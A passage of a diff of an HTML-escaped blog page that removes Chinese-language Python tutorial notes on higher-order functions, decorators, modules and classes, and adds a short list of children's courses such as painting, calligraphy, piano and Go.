-&lt;p&gt;这种函数称之为高阶函数，如&lt;code class=&quot;highlighter-rouge&quot;&gt;add&lt;/code&gt;。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;map/reduce/filter/sorted&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;这里的map非数据结构map，而是一种高阶函数：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; def f(x):
-...     return x * x
-...
-&amp;gt;&amp;gt;&amp;gt; r = map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])
-&amp;gt;&amp;gt;&amp;gt; list(r)
-[1, 4, 9, 16, 25, 36, 49, 64, 81]
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;map是将一个函数诸葛作用在list的元素上，结果r是一个迭代器Iterator，Iterator是惰性序列，因此通过list()函数让它把整个序列都计算出来并返回一个list。&lt;/p&gt;
-
-&lt;p&gt;reduce把一个函数作用在一个序列[x1, x2, x3, …]上，这个函数必须接收两个参数，reduce把结果继续和序列的下一个元素做累积计算，其效果就是：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reduce(f, [x1, x2, x3, x4]) = f(f(f(x1, x2), x3), x4)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;比如一个map/reduce的&lt;code class=&quot;highlighter-rouge&quot;&gt;str2int&lt;/code&gt;例子（字符串也是一个list）:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from functools import reduce
-
-def str2int(s):
-    def fn(x, y):
-        return x * 10 + y
-    def char2num(s):
-        return {'0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9}[s]
-    return reduce(fn, map(char2num, s))
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;用lambda函数进一步简化成：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from functools import reduce
-
-def char2num(s):
-    return {'0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9}[s]
-
-def str2int(s):
-    return reduce(lambda x, y: x * 10 + y, map(char2num, s))
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;filter的作用是把传入的函数依次作用于每个元素，然后根据返回值是True还是False决定保留还是丢弃该元素：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def is_odd(n):
-...    return n % 2 == 1
-...
-&amp;gt;&amp;gt;&amp;gt; list(filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15]))
-[1, 5, 9, 15]
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;sorted()函数也是一个高阶函数，它还可以接收一个key函数来实现自定义的排序，例如按绝对值大小排序：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; sorted([36, 5, -12, 9, -21], key=abs)
-[5, 9, -12, -21, 36]
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;函数式编程&quot;&gt;函数式编程&lt;/h3&gt;
-&lt;p&gt;函数作为返回值：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def lazy_sum(*args):
-    def sum():
-        ax = 0
-        for n in args:
-            ax = ax + n
-        return ax
-    return sum
-&amp;gt;&amp;gt;&amp;gt; f = lazy_sum(1, 3, 5, 7, 9)
-&amp;gt;&amp;gt;&amp;gt; f()
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;lazy_sum 每次返回的是一个新的函数对象，而且lazy_sum里使用了闭包的功能，共享参数args。&lt;/p&gt;
-
-&lt;p&gt;匿名函数：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; list(map(lambda x: x * x, [1, 2, 3, 4, 5, 6, 7, 8, 9]))
-[1, 4, 9, 16, 25, 36, 49, 64, 81]
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;实际上相当于：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def f(x):
-    return x * x
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;关键字lambda表示匿名函数，冒号前面的x表示函数参数。&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; f = lambda x, y: x * y
-&amp;gt;&amp;gt;&amp;gt; f(2, 3)
-6
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;将匿名函数当作返回值，生成一个新函数&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def build(x, y):
-    return lambda: x * x + y * y
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;装饰器&lt;/p&gt;
-
-&lt;p&gt;在代码运行期间动态增加功能的方式，称之为“装饰器”（Decorator），本质上，decorator就是一个返回函数的高阶函数。&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def log(text):
-    def wrapper(*args, **kw):
-        print('%s %s():' % (text, func.__name__))
-        return func(*args, **kw)
-    return wrapper
-
-@log
-def now():
-    print('2017-06-26')
-
-&amp;gt;&amp;gt;&amp;gt; now()
-call now():
-2017-06-26
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;把&lt;code class=&quot;highlighter-rouge&quot;&gt;@log&lt;/code&gt;放到&lt;code class=&quot;highlighter-rouge&quot;&gt;now()&lt;/code&gt;函数的定义处，相当于执行了语句：&lt;code class=&quot;highlighter-rouge&quot;&gt;now = log(now)&lt;/code&gt;, 现在同名的now变量指向了新的函数，于是调用now()将执行新函数，即在log()函数中返回的wrapper()函数。&lt;/p&gt;
-
-&lt;p&gt;再定义带参数的装饰器：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def log(text):
-    def decorator(func):
-        # 更改函数名称__name__使用
-        @functools.wraps(func)
-        def wrapper(*args, **kw):
-            print('%s %s():' % (text, func.__name__))
-            return func(*args, **kw)
-        return wrapper
-    return decorator
-
-@log('execute')
-def now():
-    print('2017-06-26')
-
-&amp;gt;&amp;gt;&amp;gt; now()
-execute now():
-2017-06-26
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;执行装饰器相当于：&lt;code class=&quot;highlighter-rouge&quot;&gt;now = log('execute')(now)&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;偏函数&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import functools
-&amp;gt;&amp;gt;&amp;gt; int2 = functools.partial(int, base=2)
-&amp;gt;&amp;gt;&amp;gt; int2('1000000')
-64
-&amp;gt;&amp;gt;&amp;gt; int2('1010101')
-85
-&amp;gt;&amp;gt;&amp;gt; int2('1000000', base=10)
-1000000
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;functools.partial的作用就是，把一个函数的某些参数给固定住（也就是设置默认值），返回一个新的函数，简化函数调用。&lt;/p&gt;
-
-&lt;h3 id=&quot;模块&quot;&gt;模块&lt;/h3&gt;
-
-&lt;p&gt;在Python中，一个.py文件就称之为一个模块（Module）。&lt;/p&gt;
-
-&lt;p&gt;为了避免模块名冲突，Python又引入了按目录来组织模块的方法，称为包（Package）。每一个包目录下面都会有一个&lt;code class=&quot;highlighter-rouge&quot;&gt;__init__.py&lt;/code&gt;的文件，这个文件是必须存在的，否则，Python就把这个目录当成普通目录，而不是一个包。&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__init__.py&lt;/code&gt;可以是空文件，也可以有Python代码，&lt;strong&gt;因为&lt;code class=&quot;highlighter-rouge&quot;&gt;__init__.py&lt;/code&gt;本身就是一个模块，而它的模块名就是目录名&lt;/strong&gt;。&lt;/p&gt;
-
-&lt;p&gt;使用模块&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import os
-print(os.path.join('C:\\windows', 'system32'))
-
-import os.path
-print(os.path.join('C:\\windows', 'system32'))
-
-from os.path import join
-print(join('C:\\windows', 'system32'))
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;import&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;关于import使用有几个注意地方：&lt;/p&gt;
+&lt;p&gt;提供课程有：&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;import可用来导入包，或者模块（即文件）&lt;/li&gt;
-  &lt;li&gt;要一直导入到具体模块&lt;code class=&quot;highlighter-rouge&quot;&gt;import package.sub1.sub2.mod&lt;/code&gt; 才能用mod里面的 &lt;code class=&quot;highlighter-rouge&quot;&gt;package.sub1.sub2.mod.Class&lt;/code&gt;
-这里只导入包不行，例如&lt;code class=&quot;highlighter-rouge&quot;&gt;import package&lt;/code&gt; 或 &lt;code class=&quot;highlighter-rouge&quot;&gt;import package.sub1&lt;/code&gt;, 要一直导入具体模块&lt;/li&gt;
-  &lt;li&gt;有的代码只导入最外层的package即可，是因为在package里的各层__init__.py里作了层层import，或from import&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__init__.py&lt;/code&gt;本身也是一个模块，它的模块名即目录名&lt;/li&gt;
-  &lt;li&gt;避免循环import，如：a里import b，b里又import a&lt;/li&gt;
-  &lt;li&gt;调用时如果想缩减包名，使用 from import 方式&lt;/li&gt;
-  &lt;li&gt;在一个共同包内，如果想调用其他模块，可使用相对import，如: &lt;code class=&quot;highlighter-rouge&quot;&gt;from .mod import Class&lt;/code&gt;，&lt;code class=&quot;highlighter-rouge&quot;&gt;from . import subpackage1&lt;/code&gt;等&lt;/li&gt;
+  &lt;li&gt;书画类：创意儿童画、素描、泥塑、铅笔字、钢笔字、毛笔字&lt;/li&gt;
+  &lt;li&gt;声乐类：钢琴、吉他&lt;/li&gt;
+  &lt;li&gt;幼小衔接：汉语拼音、数学、语文&lt;/li&gt;
+  &lt;li&gt;棋  类：围棋&lt;/li&gt;
+  &lt;li&gt;其他类：晚托班、暑期全托班、新概念英语、课余一对一辅导、泓数学&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;可参考这篇文章 &lt;a href=&quot;http://codingpy.com/article/python-import-101/&quot;&gt;python导入模块的几种姿势&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;作用域&lt;/p&gt;
-
-&lt;p&gt;模块内作用域是通过&lt;code class=&quot;highlighter-rouge&quot;&gt;_&lt;/code&gt;来区分的：&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__xxx__&lt;/code&gt;: 特殊变量比如 &lt;code class=&quot;highlighter-rouge&quot;&gt;__author__&lt;/code&gt;， &lt;code class=&quot;highlighter-rouge&quot;&gt;__name__&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;_xxx&lt;/code&gt;: 非公开的变量和函数，不应该直接被引用&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;xxx&lt;/code&gt;: 正常变量或函数，可直接引用&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;pip&lt;/p&gt;
-
-&lt;p&gt;一般来说，第三方库都会在Python官方的pypi.python.org网站注册，要安装一个第三方库，必须先知道该库的名称，可以在官网或者pypi上搜索，比如Pillow的名称叫Pillow，因此，安装Pillow的命令就是：&lt;code class=&quot;highlighter-rouge&quot;&gt;pip install Pillow&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;面相对象编程&quot;&gt;面相对象编程&lt;/h3&gt;
-
-&lt;p&gt;先看定义一个类：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class Student(object):
-
-    def __init__(self, name, score):
-        self.name = name
-        self.score = score
-
-    def print_score(self):
-        print('%s: %s' % (self.name, self.score))
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;object 是所有类的基类，self表示实例本身&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; bart = Student('Bart Simpson', 59)
-&amp;gt;&amp;gt;&amp;gt; bart.name
-'Bart Simpson'
-&amp;gt;&amp;gt;&amp;gt; bart.score
-59
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;访问限制
-实例的变量名如果以__开头，就变成了一个私有变量（private）&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class Student(object):
-
-    def __init__(self, name, score):
-        self.__name = name
-        self.__score = score
-
-    def print_score(self):
-        print('%s: %s' % (self.__name, self.__score))
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;但是变量名类似&lt;code class=&quot;highlighter-rouge&quot;&gt;__xxx__&lt;/code&gt;的，也就是以双下划线开头，并且以双下划线结尾的，是特殊变量，特殊变量是可以直接访问的，不是private变量&lt;/p&gt;
-
-&lt;p&gt;还有一类变量类似&lt;code class=&quot;highlighter-rouge&quot;&gt;_xxx&lt;/code&gt;的，虽然外部也可以访问，但是约定俗成，也当作私有变量看待&lt;/p&gt;
-
-&lt;p&gt;file-like object 函数&lt;/p&gt;
-
-&lt;p&gt;对真正的文件对象，它有一个read()方法，返回其内容。但是，许多对象，只要有read()方法，都被视为&lt;code class=&quot;highlighter-rouge&quot;&gt;file-like object&lt;/code&gt;。许多函数接收的参数就是“file-like object“，你不一定要传入真正的文件对象，完全可以传入任何实现了read()方法的对象。&lt;/p&gt;
-
-&lt;p&gt;获取对象信息&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;type()&lt;/code&gt;: 判断对象类型&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;isinstance()&lt;/code&gt;: 判断一个对象是否是某个类型&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dir()&lt;/code&gt;: 获得一个对象的所有属性和方法。&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; dir('ABC')
-['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;类似&lt;code class=&quot;highlighter-rouge&quot;&gt;__xxx__&lt;/code&gt;的属性和方法在Python中都是有特殊用途的，比如&lt;code class=&quot;highlighter-rouge&quot;&gt;__len__&lt;/code&gt;方法返回长度。在Python中，如果你调用&lt;code class=&quot;highlighter-rouge&quot;&gt;len()&lt;/code&gt;函数试图获取一个对象的长度，实际上，在&lt;code class=&quot;highlighter-rouge&quot;&gt;len()&lt;/code&gt;函数内部，它自动去调用该对象的&lt;code class=&quot;highlighter-rouge&quot;&gt;__len__()&lt;/code&gt;方法，所以，下面的代码是等价的：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; len('ABC')
-3
-&amp;gt;&amp;gt;&amp;gt; 'ABC'.__len__()
-3
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;此外还有&lt;code class=&quot;highlighter-rouge&quot;&gt;getattr()&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;setattr()&lt;/code&gt;以及&lt;code class=&quot;highlighter-rouge&quot;&gt;hasattr()&lt;/code&gt; 操作对象属性&lt;/p&gt;
-
-&lt;p&gt;实例属性&lt;/p&gt;
-
-&lt;p&gt;直接在class中定义属性，这种属性是类属性，归类所有：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class Student(object):
-    name = 'Student'
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;这个属性所有实例都能访问到&lt;/p&gt;
-
-&lt;p&gt;使用__slots__&lt;/p&gt;
-
-&lt;p&gt;通常python的类也像js一样，可以动态增加属性和方法，如果想限制实例的属性，可以用__slots__:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class Student(object):
-    __slots__ = ('name', 'age') # 用tuple定义允许绑定的属性名称
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;这样只允许增加name和age两个属性，子类实例允许定义的属性就是自身的__slots__加上父类的__slots__。&lt;/p&gt;
-
-&lt;p&gt;使用@property&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Student&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;@property&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;score&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_score&lt;/span&gt;
-
-    &lt;span class=&quot;err&quot;&gt;@score&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setter&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;score&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isinstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ValueError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;score&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;must&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;be&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;an&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;integer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ValueError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;score&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;must&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;between&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_score&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;
-
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Student&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;score&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，实际转化为&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_score&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;score&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，实际转化为&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_score&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;score&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9999&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;Traceback&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;most&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recent&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;last&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;ValueError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;score&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;must&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;between&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;定制类&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__slots__&lt;/code&gt;: 限制动态增加的属性
-&lt;code class=&quot;highlighter-rouge&quot;&gt;__str__()&lt;/code&gt;: 作用于print，打印类信息，返回用户看到的信息
-&lt;code class=&quot;highlighter-rouge&quot;&gt;__repr__()&lt;/code&gt;: 返回开发者看到的信息
-&lt;code class=&quot;highlighter-rouge&quot;&gt;__iter__()&lt;/code&gt;: 可用于for in 循环&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class Fib(object):
-    def __init__(self):
-        self.a, self.b = 0, 1 # 初始化两个计数器a，b
-
-    def __iter__(self):
-        return self # 实例本身就是迭代对象，故返回自己
-
-    def __next__(self):
-        self.a, self.b = self.b, self.a + self.b # 计算下一个值
-        if self.a &amp;gt; 100000: # 退出循环的条件
-            raise StopIteration()
-        return self.a # 返回下一个值
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__getitem__&lt;/code&gt;: 比如像list一样获取第5个元素&lt;/p&gt;
-
-&lt;p&gt;此外还有&lt;code class=&quot;highlighter-rouge&quot;&gt;__call__()&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;__getattr__&lt;/code&gt;等，都可用来定制化一个类。&lt;/p&gt;
-
-&lt;p&gt;枚举类&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from enum import Enum
-
